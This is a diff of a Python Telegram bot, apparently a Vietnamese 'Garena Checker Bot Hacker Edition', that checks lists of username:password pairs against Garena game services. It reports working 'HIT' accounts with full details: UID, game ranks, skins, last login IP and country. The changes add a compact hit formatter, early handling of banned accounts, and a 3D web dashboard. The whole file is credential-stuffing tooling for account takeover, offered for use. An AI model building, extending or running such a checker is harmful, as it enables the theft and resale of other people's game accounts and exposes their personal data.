@@ -1,11 +1,14 @@
 # ========================================================================
-#    GARENA CHECKER BOT V6.1 - LOC ACC BAN + TU DONG XOA TIN NHAN
+#    GARENA CHECKER BOT V6.1 - FULL VERSION
 # ========================================================================
 #    - Tu dong loc acc bi BAN (khong hien thi)
 #    - Tu dong xoa tin nhan tien do va batch
 #    - Chi hien thi HIT (acc sach) va DEAD (acc chet)
 #    - Khong hien thi acc bi BAN
-#    - Tra ket qua FULL INFO cho HIT
+#    - Tra ket qua FULL INFO cho HIT (compact - an truong rong/NO/0)
+#    - Web dashboard voi hieu ung 3D + am thanh
+#    - Upload audio custom
+#    - Thong ke day du
 # ========================================================================
 
 import subprocess
@@ -442,7 +445,7 @@ body {
     
     <div class="footer">
         <p>© 2024 <a href="https://t.me/baohuyno1">@baohuyno1</a> - All rights reserved</p>
-        <p style="color:#334433;font-size:0.65em;">⚡ HACKER EDITION - AUTO DELETE - FILTER BANNED</p>
+        <p style="color:#334433;font-size:0.65em;">⚡ HACKER EDITION - AUTO DELETE - FILTER BANNED - COMPACT HIT</p>
     </div>
 </div>
 
@@ -671,7 +674,7 @@ setInterval(updateStats, 3000);
 updateStats();
 
 console.log('🔥 GARENA CHECKER HACKER EDITION LOADED!');
-console.log('📊 FILTER BANNED - AUTO DELETE PROGRESS');
+console.log('📊 FILTER BANNED - AUTO DELETE PROGRESS - COMPACT HIT');
 </script>
 </body>
 </html>"""
@@ -716,6 +719,7 @@ def start_render_server():
         print(f"[*] AM THANH TU DONG PHAT")
         print(f"[*] LOC ACC BAN - CHI HIEN THI HIT + DEAD")
         print(f"[*] TU DONG XOA TIN NHAN TIEN DO")
+        print(f"[*] HIT COMPACT - AN TRUONG RONG/NO/0")
         server.serve_forever()
     except Exception as e:
         print(f"[!] Loi web server: {e}")
@@ -821,7 +825,6 @@ start_time = time.time()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
 
-# Bien luu tin nhan de tu dong xoa
 last_progress_msg = None
 last_batch_msg = None
 
@@ -949,7 +952,6 @@ Sau do bam nut xac nhan lai.
         )
 
 def safe_send_message(chat_id, text, parse_mode="HTML", auto_delete=False, delete_after=5):
-    """Gui tin nhan va tu dong xoa neu auto_delete=True"""
     if not text:
         return None
     
@@ -971,7 +973,6 @@ def safe_send_message(chat_id, text, parse_mode="HTML", auto_delete=False, delet
             return None
 
 def delete_after_delay(chat_id, message_id, delay):
-    """Xoa tin nhan sau delay giay"""
     time.sleep(delay)
     try:
         bot.delete_message(chat_id, message_id)
@@ -979,7 +980,6 @@ def delete_after_delay(chat_id, message_id, delay):
         pass
 
 def safe_delete_message(chat_id, message_id):
-    """Xoa tin nhan an toan"""
     if not message_id:
         return
     try:
@@ -1146,16 +1146,35 @@ def save_loc_file(accounts):
             for user, pwd in accounts:
                 f.write(f"{user}:{pwd}\n")
 
-# KHONG LUU KET QUA (chi luu thong ke)
-def save_result(username, password, status, service=""):
-    pass
-
 def format_value(value):
     if isinstance(value, bool):
         return "YES" if value else "NO"
     elif isinstance(value, str) and value.lower() in ["true", "false"]:
         return "YES" if value.lower() == "true" else "NO"
     return value
+
+def should_skip_field(value):
+    """Kiem tra xem co nen an truong nay khong"""
+    if value is None:
+        return True
+    if isinstance(value, str):
+        value_lower = value.lower().strip()
+        # An cac gia tri rong hoac khong co
+        if value_lower in ["", "no", "none", "null", "n/a", "chưa xác thực", "chua xac thuc", "0", "0.0", "false"]:
+            return True
+        # An cac truong Email/SDT/Pass/FB/CCCD/Authen neu la No
+        if any(word in value_lower for word in ["chưa", "chua", "no", "none", "null"]):
+            if "email" in value_lower or "sdt" in value_lower or "pass" in value_lower or "fb" in value_lower or "cccd" in value_lower or "authen" in value_lower:
+                return True
+        return False
+    if isinstance(value, (int, float)):
+        if value == 0:
+            # Khong an cac truong shells, so, ss, sss, anime
+            return False
+    if isinstance(value, bool):
+        if value is False:
+            return True
+    return False
 
 def check_account_api(username, password, service, use_delay=True):
     if use_delay:
@@ -1227,6 +1246,14 @@ def check_account_api(username, password, service, use_delay=True):
                                     is_banned = True
                                     break
                         
+                        # Neu bi banned -> tra ve banned
+                        if is_banned:
+                            result_data["result"] = "banned"
+                            result_data["_is_banned"] = True
+                            with cache_lock:
+                                cache_results[cache_key] = result_data
+                            return result_data
+                        
                         # Kiem tra status
                         status_val = result_data.get("status")
                         if status_val is not None:
@@ -1274,14 +1301,8 @@ def check_account_api(username, password, service, use_delay=True):
                                 is_hit = True
                                 break
                         
-                        # Neu bi banned -> set dead
-                        if is_banned:
-                            is_hit = False
-                            result_data["result"] = "banned"
-                        else:
-                            result_data["result"] = "hit" if is_hit else "dead"
-                        
-                        result_data["_is_banned"] = is_banned
+                        result_data["result"] = "hit" if is_hit else "dead"
+                        result_data["_is_banned"] = False
                         
                         with cache_lock:
                             cache_results[cache_key] = result_data
@@ -1345,19 +1366,17 @@ def check_account_api(username, password, service, use_delay=True):
         cache_results[cache_key] = result
     return result
 
-def format_full_info(username, password, service, result_data):
-    """Format FULL INFO cho ket qua HIT"""
+def format_full_info_compact(username, password, service, result_data):
+    """Format FULL INFO cho HIT - an cac truong rong/NO/0"""
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
     
     line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
     
-    # Header
     msg = f"{line}\n{icon} <b>HIT - {service_desc}</b>\n{line}\n"
-    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n\n"
+    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
     
     if isinstance(result_data, dict):
-        # Danh sach field hien thi theo nhom
         sections = {
             "📌 THONG TIN CO BAN": [
                 ("UID", "uid"),
@@ -1368,21 +1387,10 @@ def format_full_info(username, password, service, result_data):
                 ("Shells", "shells"),
                 ("So", "so"),
             ],
-            "🔐 BAO MAT": [
-                ("Email Verified", "email_verified"),
-                ("Email", "email"),
-                ("Mobile Bound", "mobile_bound"),
-                ("Phone", "phone"),
-                ("FB Linked", "fb_linked"),
-                ("FB", "fb"),
-                ("Password Set", "password_set"),
-                ("Account Secured", "account_secured"),
-            ],
             "🎮 LIEN QUAN": [
                 ("AOV Name", "aov_name"),
                 ("AOV Rank", "aov_rank"),
                 ("AOV Level", "aov_level"),
-                ("AOV Banned", "aov_banned"),
                 ("Total Skins", "aov_total_skins"),
                 ("Total Champs", "aov_total_champs"),
                 ("SS Count", "aov_ss"),
@@ -1401,11 +1409,8 @@ def format_full_info(username, password, service, result_data):
                 ("Last Login", "last_login"),
                 ("Last Session IP", "last_session_ip"),
                 ("Last Session Country", "last_session_country"),
-                ("Banned", "banned"),
                 ("Ban Until", "ban_until"),
                 ("Ban Reason", "ban_reason"),
-                ("CCCD", "cccd"),
-                ("Authen", "authen"),
                 ("Tinh Trang", "tinh_trang"),
                 ("Ngay Tao TK", "ngay_tao_tk"),
             ]
@@ -1419,14 +1424,14 @@ def format_full_info(username, password, service, result_data):
                 if field in result_data:
                     value = result_data[field]
                     
-                    if value is None or value == "" or value == "N/A":
+                    if should_skip_field(value):
                         continue
                     
                     if isinstance(value, bool):
                         value = "YES" if value else "NO"
                     
                     if isinstance(value, (int, float)) and value == 0:
-                        if field not in ["shells", "so", "aov_ss", "aov_sss", "aov_anime", "aov_level", "aov_total_skins", "aov_total_champs"]:
+                        if field not in ["shells", "so", "aov_ss", "aov_sss", "aov_anime"]:
                             continue
                     
                     if isinstance(value, str):
@@ -1458,7 +1463,7 @@ def format_full_info(username, password, service, result_data):
                         info_lines.append(f"  ... va {len(value) - 30} item khac")
         
         if info_lines:
-            msg += "\n".join(info_lines)
+            msg += "\n" + "\n".join(info_lines)
         
         msg += f"\n\n{line}"
     
@@ -1481,13 +1486,12 @@ def check_single(chat_id, username, password, service="lienquan"):
     result_type = result.get("result", "unknown")
     is_banned = result.get("_is_banned", False)
     
-    # Neu bi banned -> bo qua khong hien thi
     if is_banned or result_type == "banned":
         update_stats(banned_count=1)
         return
     
     if result_type == "hit":
-        hit_msg = format_full_info(username, password, service, result)
+        hit_msg = format_full_info_compact(username, password, service, result)
         safe_send_message(chat_id, hit_msg)
         update_stats(hit_count=1)
     elif result_type == "dead":
@@ -1557,18 +1561,17 @@ def check_batch(chat_id, accounts, service):
             
             if is_banned or result_type == "banned":
                 stats["banned"] += 1
-                return  # Khong hien thi acc bi ban
+                return
             
             if result_type == "hit":
                 stats["hits"] += 1
                 try:
-                    hit_msg = format_full_info(user, pwd, service, result)
+                    hit_msg = format_full_info_compact(user, pwd, service, result)
                     safe_send_message(chat_id, hit_msg)
                 except Exception as e:
                     print(f"[!] Loi gui hit: {e}")
             elif result_type == "dead":
                 stats["dead"] += 1
-                # Khong hien thi dead
             else:
                 stats["errors"] += 1
     
@@ -1633,7 +1636,6 @@ def check_batch(chat_id, accounts, service):
         accounts=accounts
     )
     
-    # Tong ket
     summary = f"""
 ✅ <b>CHECK HOAN TAT!</b>
 ━━━━━━━━━━━━━━━━━━━━━━
@@ -1647,7 +1649,6 @@ def check_batch(chat_id, accounts, service):
 ━━━━━━━━━━━━━━━━━━━━━━
 """
     
-    # Chi hien thi HIT LIST
     hits_list = [r for r in all_results if r["status"] == "hit" and not r["banned"]]
     if hits_list:
         summary += f"\n📌 <b>HIT LIST ({len(hits_list)}):</b>\n"
@@ -1658,7 +1659,6 @@ def check_batch(chat_id, accounts, service):
     
     safe_send_message(chat_id, summary)
     
-    # Gui file thong ke
     try:
         with open(STATS_FILE, 'r', encoding='utf-8') as f:
             bot.send_document(chat_id, f, caption=f"📊 check_stats.json - {stats['hits']} hits")
@@ -1724,7 +1724,7 @@ def check_all_services(chat_id, accounts):
             if result_type == "hit":
                 stats_all["hits"] += 1
                 try:
-                    hit_msg = format_full_info(user, pwd, service, result)
+                    hit_msg = format_full_info_compact(user, pwd, service, result)
                     safe_send_message(chat_id, hit_msg)
                 except:
                     pass
@@ -1935,8 +1935,10 @@ def cmd_start(message):
 ✅ Loc acc bi BAN - Khong hien thi
 ✅ Tu dong xoa tin nhan tien do
 ✅ Chi hien thi HIT (Sach) va DEAD
+✅ HIT COMPACT - An truong rong/NO/0
 ✅ FULL INFO cho HIT
 ✅ Luu thong ke vao check_stats.json
+✅ Web dashboard voi hieu ung 3D + am thanh
 """)
 
 @bot.message_handler(commands=['check'])
@@ -2148,6 +2150,7 @@ def main():
     print("    ===== KHONG LUU ACCOUNT ===== ")
     print("    ===== LOC ACC BAN - KHONG HIEN THI ===== ")
     print("    ===== TU DONG XOA TIN NHAN TIEN DO ===== ")
+    print("    ===== HIT COMPACT - AN TRUONG RONG/NO/0 ===== ")
     print("=" * 60)
     
     while True:
